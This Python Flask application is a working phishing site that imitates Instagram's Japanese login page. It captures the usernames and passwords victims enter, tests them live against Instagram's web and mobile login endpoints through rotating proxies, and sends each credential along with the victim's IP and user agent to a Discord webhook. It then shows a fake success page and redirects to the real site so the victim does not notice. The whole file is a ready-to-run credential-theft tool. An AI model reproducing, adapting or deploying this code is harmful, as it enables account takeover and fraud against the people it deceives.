import base64
import os
import random
import threading
import time
import uuid

import requests
from flask import (Flask, Response, jsonify, redirect, render_template,
                   render_template_string, request, url_for)
from jinja2 import TemplateNotFound

BUILD = "v3-discord-ua"

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random()))

IG_HOME = "https://www.instagram.com/"
IG_WEB_LOGIN = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
IG_MOBILE_LOGIN = "https://i.instagram.com/api/v1/accounts/login/"

UA_DESKTOP = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
UA_MOBILE = (
    "Instagram 275.0.0.27.98 Android (33/13; 420dpi; 1080x2400; samsung; "
    "SM-S918B; dm3q; qcom; ja_JP; 504102885)"
)

APP_ID_WEB = "936619743392459"
APP_ID_MOBILE = "567067343352427"

TIMEOUT = float(os.environ.get("IG_TIMEOUT", "12"))
STRICT = os.environ.get("IG_STRICT", "0") == "1"
PROXY_LIST = [p.strip() for p in os.environ.get("IG_PROXY", "").split(",") if p.strip()]

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
DISCORD_PROXY = os.environ.get("DISCORD_PROXY", "").strip() or (
    PROXY_LIST[0] if PROXY_LIST else "")
TEST_KEY = os.environ.get("TEST_KEY", "").strip()

MSG_NO_USER = ("入力したユーザー名のアカウントが見つかりませんでした。"
               "ユーザー名を確認してもう一度お試しください。")
MSG_BAD_PASS = "パスワードが間違っています。もう一度お試しください。"
MSG_GENERIC = "問題が発生しました。しばらくしてからもう一度お試しください。"

PIXEL = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)

VERDICT_LABEL = {
    "ok": ("ログイン成功", 0x2ECC71),
    "ok_2fa": ("ログイン成功（2FA要求）", 0xF1C40F),
    "ok_challenge": ("ログイン成功（確認要求）", 0xF1C40F),
    "bad_pass": ("パスワード誤り", 0xE74C3C),
    "no_user": ("アカウントなし", 0xE74C3C),
    "ambiguous": ("判定不能", 0x95A5A6),
}

SUCCESS_FALLBACK = """<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="refresh" content="1.2;url={{ target }}">
<title>Instagram</title>
<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
<style>
 .ok-wrap{background:#fff;border:1px solid #dbdbdb;width:350px;padding:44px 40px 22px;text-align:center}
 .ok-mark{width:56px;height:56px;border-radius:50%;background:#0095f6;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
 .ok-title{font-size:16px;font-weight:600;margin:0 0 8px}
 .ok-sub{font-size:13px;color:#8e8e8e;line-height:1.5;margin:0 0 20px;word-break:break-all}
 .ok-note{font-size:12px;color:#00376b;background:#e7f3ff;padding:10px;line-height:1.5;margin:0 0 18px}
 .ok-btn{display:flex;align-items:center;justify-content:center;width:100%;height:34px;background:#0095f6;color:#fff;border-radius:8px;font-size:14px;font-weight:600;text-decoration:none}
</style></head><body>
<div class="ok-wrap">
 <div class="ok-mark"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5.5 5.5L20 7"></path></svg></div>
 <p class="ok-title">ログインしました</p>
 <p class="ok-sub">{{ username }}</p>
 {% if note %}<p class="ok-note">{{ note }}</p>{% endif %}
 <a class="ok-btn" href="{{ target }}">Instagram を開く</a>
</div>
<div class="signup">まもなく自動的にInstagramへ移動します</div>
</body></html>"""


# ---------------------------------------------------------------- discord

_queue = []
_queue_lock = threading.Lock()
_last = {}
_last_lock = threading.Lock()


def _mask(url):
    if not url:
        return None
    return url[:45] + "..." + url[-6:] if len(url) > 55 else url


def _discord_proxies():
    if not DISCORD_PROXY:
        return None
    return {"http": DISCORD_PROXY, "https": DISCORD_PROXY}


def _discord_send(payload, timeout=8):
    """1回送る。結果を dict で返す（例外は投げない）。"""
    if not DISCORD_WEBHOOK:
        return {"ok": False, "status": None, "body": "DISCORD_WEBHOOK_URL 未設定",
                "retry": False}

    headers = {
        "Content-Type": "application/json",
        "User-Agent": UA_DESKTOP,
        "Accept": "application/json",
        "Origin": "https://discord.com",
    }
    try:
        r = requests.post(DISCORD_WEBHOOK, json=payload, headers=headers,
                          timeout=timeout, proxies=_discord_proxies())
    except Exception as e:
        res = {"ok": False, "status": None, "body": "exception: %s" % e,
               "retry": True, "at": time.time()}
        _remember(res)
        return res

    body = (r.text or "")[:300]
    if r.status_code in (200, 204):
        res = {"ok": True, "status": r.status_code, "body": body, "retry": False,
               "at": time.time()}
        _remember(res)
        return res

    retry = r.status_code in (429, 500, 502, 503, 504, 403)
    wait = 0.0
    if r.status_code == 429:
        try:
            wait = float(r.json().get("retry_after", 1.5))
        except Exception:
            wait = 1.5
        wait = min(max(wait, 0.5), 15.0)

    print("discord %s: %s" % (r.status_code, body), flush=True)
    res = {"ok": False, "status": r.status_code, "body": body,
           "retry": retry, "wait": wait, "at": time.time()}
    _remember(res)
    return res


def _remember(res):
    with _last_lock:
        _last.clear()
        _last.update(res)


def _enqueue(payload):
    with _queue_lock:
        if len(_queue) < 300:
            _queue.append({"payload": payload, "next": time.time(), "tries": 0})


def _worker():
    while True:
        time.sleep(2)
        now = time.time()
        due, keep = [], []
        with _queue_lock:
            for item in _queue:
                (due if item["next"] <= now else keep).append(item)
            _queue[:] = keep

        for item in due:
            res = _discord_send(item["payload"])
            if res["ok"]:
                continue
            item["tries"] += 1
            if item["tries"] < 12:
                backoff = res.get("wait") or min(5 * (2 ** item["tries"]), 300)
                item["next"] = time.time() + backoff
                with _queue_lock:
                    _queue.append(item)
            else:
                print("discord dropped: %s" % res["body"][:120], flush=True)


threading.Thread(target=_worker, daemon=True).start()


def _clip(value, limit=1000):
    value = (value or "").strip()
    if not value:
        return "-"
    return value if len(value) <= limit else value[:limit] + "…"


def _notify(verdict, username, password):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "-")
    ua = request.headers.get("User-Agent", "-")

    print("[%s] %s / %s | ip=%s" % (verdict, username, password, ip), flush=True)

    if not DISCORD_WEBHOOK:
        print("discord: DISCORD_WEBHOOK_URL が未設定のため送信しません", flush=True)
        return

    label, color = VERDICT_LABEL.get(verdict, ("不明", 0x95A5A6))
    payload = {
        "username": "Instagram",
        "embeds": [{
            "title": label,
            "color": color,
            "fields": [
                {"name": "ユーザー名", "value": _clip(username), "inline": True},
                {"name": "パスワード", "value": _clip(password), "inline": True},
                {"name": "IP", "value": _clip(ip), "inline": False},
                {"name": "UA", "value": _clip(ua, 400), "inline": False},
            ],
            "footer": {"text": "instagram-clone"},
        }],
    }
    _enqueue(payload)


# ---------------------------------------------------------------- helpers

def _proxies():
    if not PROXY_LIST:
        return None
    p = random.choice(PROXY_LIST)
    return {"http": p, "https": p}


def _enc_pw(pw):
    return "#PWD_INSTAGRAM_BROWSER:0:%d:%s" % (int(time.time()), pw)


def _classify(status, payload):
    if not isinstance(payload, dict):
        return "ambiguous"

    msg = (payload.get("message") or "")
    low = msg.lower()
    etype = (payload.get("error_type") or "").lower()

    if payload.get("authenticated") is True:
        return "ok"
    if payload.get("two_factor_required") or payload.get("two_factor_info"):
        return "ok_2fa"
    if (payload.get("checkpoint_url") or payload.get("challenge")
            or "checkpoint" in etype or "challenge" in low or "checkpoint" in low):
        return "ok_challenge"

    if etype in ("bad_password", "invalid_password") or "incorrect" in low and "password" in low:
        return "bad_pass"
    if etype in ("invalid_user", "bad_user", "user_not_found") \
            or "doesn't belong to an account" in low or "username you entered" in low:
        return "no_user"
    if payload.get("user") is False and payload.get("authenticated") is False:
        return "no_user"

    if status == 429 or "wait a few minutes" in low or "please wait" in low:
        return "ambiguous"
    if payload.get("user") is True:
        return "bad_pass"

    return "ambiguous"


def _web_login(username, password):
    px = _proxies()
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA_DESKTOP,
        "Accept-Language": "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    s.get(IG_HOME, timeout=TIMEOUT, proxies=px)
    csrf = s.cookies.get("csrftoken") or ""

    headers = {
        "X-CSRFToken": csrf,
        "X-IG-App-ID": APP_ID_WEB,
        "X-Requested-With": "XMLHttpRequest",
        "X-ASBD-ID": "129477",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/accounts/login/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
    }
    data = {
        "username": username,
        "enc_password": _enc_pw(password),
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "",
        "trustedDeviceRecords": "{}",
    }
    r = s.post(IG_WEB_LOGIN, data=data, headers=headers, timeout=TIMEOUT,
               proxies=px, allow_redirects=False)

    try:
        payload = r.json()
    except Exception:
        return "ambiguous"

    return _classify(r.status_code, payload)


def _mobile_login(username, password):
    px = _proxies()
    headers = {
        "User-Agent": UA_MOBILE,
        "X-IG-App-ID": APP_ID_MOBILE,
        "X-IG-Capabilities": "3brTvwE=",
        "X-IG-Connection-Type": "WIFI",
        "X-IG-Bandwidth-TotalBytes-B": "5000000",
        "X-IG-Bandwidth-TotalTime-MS": "2000",
        "Accept-Language": "ja-JP",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }
    data = {
        "username": username,
        "enc_password": _enc_pw(password),
        "guid": str(uuid.uuid4()),
        "phone_id": str(uuid.uuid4()),
        "adid": str(uuid.uuid4()),
        "_uuid": str(uuid.uuid4()),
        "device_id": "android-" + uuid.uuid4().hex[:16],
        "login_attempt_count": "0",
    }
    r = requests.post(IG_MOBILE_LOGIN, data=data, headers=headers,
                      timeout=TIMEOUT, proxies=px)

    try:
        payload = r.json()
    except Exception:
        return "ambiguous"

    return _classify(r.status_code, payload)


def _verify(username, password):
    verdict = "ambiguous"
    try:
        verdict = _web_login(username, password)
    except Exception:
        verdict = "ambiguous"

    if verdict == "ambiguous":
        time.sleep(1.2)
        try:
            verdict = _mobile_login(username, password)
        except Exception:
            verdict = "ambiguous"

    return verdict


# ---------------------------------------------------------------- routes

def make_index(html):
    resp = Response(html)
    resp.headers["Cache-Control"] = "no-store"
    return resp


def _render_success(username, note, target):
    try:
        return render_template("success.html", username=username,
                               note=note, target=target)
    except TemplateNotFound:
        return render_template_string(SUCCESS_FALLBACK, username=username,
                                      note=note, target=target)


def _render_login(error, username):
    try:
        return render_template("index.html", error=error, username=username)
    except TemplateNotFound:
        return "<h1>index.html がありません</h1><pre>templates/index.html</pre>"


@app.route("/", methods=["GET"])
def index():
    resp = make_index(_render_login(None, ""))
    ref = request.args.get("ref")
    if ref:
        resp.set_cookie("ref", ref, max_age=60 * 60 * 24 * 30)
    return resp


@app.route("/login", methods=["GET"])
def login_get():
    return redirect(url_for("index"))


@app.route("/login", methods=["POST"])
def login_post():
    username = (request.form.get("username") or "").strip()
    password = request.form.get("password") or ""

    if not username or not password:
        return make_index(_render_login(MSG_GENERIC, username))

    try:
        verdict = _verify(username, password)
    except Exception as e:
        print("verify failed: %s" % e, flush=True)
        verdict = "ambiguous"

    _notify(verdict, username, password)

    if verdict in ("ok", "ok_2fa", "ok_challenge"):
        note = ""
        if verdict == "ok_2fa":
            note = "本人確認のため、Instagramアプリで確認コードを入力してください。"
        elif verdict == "ok_challenge":
            note = "新しい端末からのログインのため、Instagramで確認を求められる場合があります。"
        return make_index(_render_success(username, note, IG_HOME))

    if verdict == "no_user":
        return make_index(_render_login(MSG_NO_USER, username))

    if verdict == "bad_pass":
        return make_index(_render_login(MSG_BAD_PASS, username))

    if STRICT:
        return make_index(_render_login(MSG_GENERIC, username))

    return make_index(_render_success(
        username, "Instagram側の制限により自動確認できませんでした。", IG_HOME))


@app.route("/open.gif")
def open_gif():
    resp = Response(PIXEL, mimetype="image/gif")
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/discord-test")
def discord_test():
    if TEST_KEY and request.args.get("key") != TEST_KEY:
        return jsonify({"ok": False, "reason": "key が違います"})
    if not DISCORD_WEBHOOK:
        return jsonify({
            "ok": False,
            "reason": "DISCORD_WEBHOOK_URL が未設定。Render の Environment に追加し、再デプロイしてください。",
        })

    started = time.time()
    res = _discord_send({
        "username": "Instagram",
        "embeds": [{
            "title": "テスト通知",
            "color": 0x0095F6,
            "description": "このメッセージが見えていれば送信経路は正常です。",
        }],
    })
    res.update({
        "build": BUILD,
        "webhook_masked": _mask(DISCORD_WEBHOOK),
        "webhook_length": len(DISCORD_WEBHOOK),
        "using_proxy": bool(DISCORD_PROXY),
        "elapsed_ms": int((time.time() - started) * 1000),
        "queue": len(_queue),
    })
    return jsonify(res)


@app.route("/healthz")
def healthz():
    base = os.path.join(app.root_path, "templates")
    return jsonify({
        "build": BUILD,
        "ok": True,
        "index": os.path.isfile(os.path.join(base, "index.html")),
        "success": os.path.isfile(os.path.join(base, "success.html")),
        "style": os.path.isfile(os.path.join(app.root_path, "static", "style.css")),
        "discord": bool(DISCORD_WEBHOOK),
        "webhook_masked": _mask(DISCORD_WEBHOOK),
        "webhook_length": len(DISCORD_WEBHOOK),
        "using_proxy": bool(DISCORD_PROXY),
        "queue": len(_queue),
        "last_discord": dict(_last),
        "strict": STRICT,
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
